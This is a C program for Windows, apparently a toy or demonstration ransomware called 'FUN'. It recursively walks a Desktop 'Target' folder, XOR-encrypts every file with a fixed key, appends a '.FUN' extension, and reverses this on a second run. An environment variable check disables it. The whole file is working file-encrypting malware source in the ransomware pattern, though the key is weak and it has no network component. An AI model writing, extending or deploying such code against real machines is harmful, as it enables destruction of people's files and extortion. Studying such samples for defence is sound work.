#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <Windows.h>

// Environment Variables
#define RELATIVE_FOLDER "\\Desktop\\Target" // Target's path
#define CRYPTO_NUM 23
#define CRYPTO_EXT ".FUN"
#define CRYPTO_EXT_LEN 4
#define CRYPTO_ENV_NAME "FUN_xor_encryption"
#define CRYPTO_ENV_VALUE "FUN"

int encrypt = -1; // 1 - encrypt, 0 - decrypt, -1 - undefined

void print_ascii_art() {
  puts("\n\n"
    "\t\t███████╗██╗   ██╗███╗   ██╗\n"
    "\t\t██╔════╝██║   ██║████╗  ██║\n"
    "\t\t█████╗  ██║   ██║██╔██╗ ██║\n"
    "\t\t██╔══╝  ██║   ██║██║╚██╗██║\n"
    "\t\t██║     ╚██████╔╝██║ ╚████║\n"
    "\t\t╚═╝      ╚═════╝ ╚═╝  ╚═══╝\n\n"
      );
}

void xor_encryption(char* file, const char* folder, const char* filename) {
  char* ext = strrchr(file, '.');

  if(encrypt == -1)
    encrypt = strcmp(ext, CRYPTO_EXT) & 1;
  else if (encrypt != (strcmp(ext, CRYPTO_EXT) & 1)) {
      puts("(-) An unexpected error occured.");
      return;
  }

  FILE* fp;
  char* content;
  long length;

  fp = fopen(file, "rb+");

  if(fp) {
    fseek(fp, 0, SEEK_END);
    length = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    content = malloc(length + 1);

    if(content) {
      length = fread(content, 1, length, fp);

      if(length) {
        rewind(fp);

        char* tmp = content;
        for(int i = 0; i < length; ++tmp, ++i)
          *tmp = *tmp ^ CRYPTO_NUM;

        fwrite(content, 1, length, fp);
      }
      free(content);
    }
    fclose(fp);
  }

  if(encrypt) {
    printf("(+) Encrypting file: %s\\%s\n", folder, filename);
    char* new_file = (char*) malloc(strlen(file) + CRYPTO_EXT_LEN + 1);
    strcpy(new_file, file);
    strcat(new_file, CRYPTO_EXT);
    rename(file, new_file);
    free(new_file);
  }
  else {
    printf("(+) Decrypting file: %s\\%s\n", folder, filename);
    char* old_file = strdup(file);
    *ext = '\0';
    rename(old_file, file);
    free(old_file);
  }
}

void files_tree(const char* folder) {
  char wildcard[MAX_PATH];
  sprintf(wildcard, "%s\\*", folder);
  WIN32_FIND_DATA fd;
  HANDLE handle = FindFirstFile(wildcard, &fd);

  if(handle == INVALID_HANDLE_VALUE) return;

  do {
    if(strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
      continue;

    char path[MAX_PATH];
    sprintf(path, "%s\\%s", folder, fd.cFileName);
    printf("(+) Opened file: %s\\%s\n", folder, fd.cFileName);

    if((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && !(fd.dwFileAttributes & (FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_DEVICE)))
      files_tree(path);
      
    if(fd.dwFileAttributes & FILE_ATTRIBUTE_ARCHIVE) {
      xor_encryption(path, folder, fd.cFileName);
    }
  } while(FindNextFile(handle, &fd));

  FindClose(handle);
}

int main(void) {
  print_ascii_art();

  char* env = getenv(CRYPTO_ENV_NAME);

  if(env == NULL || strcmp(env, CRYPTO_ENV_VALUE)){

    void* home_path = getenv("USERPROFILE");
    void* path = home_path;

    if(RELATIVE_FOLDER) {
      path = malloc(strlen(home_path) + strlen(RELATIVE_FOLDER) + 1);
      strcpy(path, home_path);
      strcat(path, RELATIVE_FOLDER);
    }

    files_tree(path);

    if(RELATIVE_FOLDER)
      free(path);
  }

  puts("(+) Finished!\n");
  return 0;
}
